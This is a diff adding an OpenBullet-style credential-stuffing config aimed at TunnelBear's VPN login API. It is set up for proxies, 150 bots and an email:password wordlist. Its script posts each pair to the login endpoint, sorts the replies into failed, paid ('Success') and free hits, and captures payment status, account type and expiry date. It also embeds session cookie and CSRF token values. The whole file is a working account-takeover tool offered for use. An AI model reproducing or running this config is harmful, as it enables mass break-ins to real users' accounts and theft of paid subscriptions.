@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "[CT] TunnelBear [APİ]",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T15:24:32.2708522+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST " https://prod-api-core.tunnelbear.com/core/web/api/login" 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=web-1.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: prod-api-core.tunnelbear.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "TB-CSRF-Token: f424b1eff9163693e8182bdbba3ec1ae6727a34c" 
+  HEADER "X-XSRF-TOKEN: f424b1eff9163693e8182bdbba3ec1ae6727a34c" 
+  HEADER "Content-Length: 80" 
+  HEADER "Origin: https://www.tunnelbear.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.tunnelbear.com/" 
+  HEADER "Cookie: PLAY_SESSION=fdccd6e79a2b0acc1f993d47acea967ae8e4027b-___AT=f424b1eff9163693e8182bdbba3ec1ae6727a34c&tbcsrf=f424b1eff9163693e8182bdbba3ec1ae6727a34c; _gcl_au=1.1.1811726508.1645725051; _uetsid=4e4f1fa0959a11ec9c84599fef0f3eeb; _uetvid=4e4f5c10959a11eca36443c2427c40d6; _ga=GA1.2.573031323.1645725051; _gid=GA1.2.1043993445.1645725051; _clck=3qh8yn|1|ez9|0; _clsk=j8dkwc|1645725425139|13|1|j.clarity.ms/collect; _gat_UA-23359981-6=1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "TE: trailers" 
+
+#KONTROL KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+    KEY "Compte suspendu pour activité malveillante potentielle" 
+  KEYCHAIN Success OR 
+    KEY "\"fullVersion\":\"1\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"fullVersion\":\"0" 
+
+#STATUS PARSE "<SOURCE>" LR "paymentStatus\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+#TYPE PARSE "<SOURCE>" LR "bearType\":\"" "\"" CreateEmpty=FALSE -> CAP "Type" 
+
+#EXPİREAT PARSE "<SOURCE>" LR "fullVersionUntil\":\"" "\"" CreateEmpty=FALSE -> CAP "Expire_At" 
+
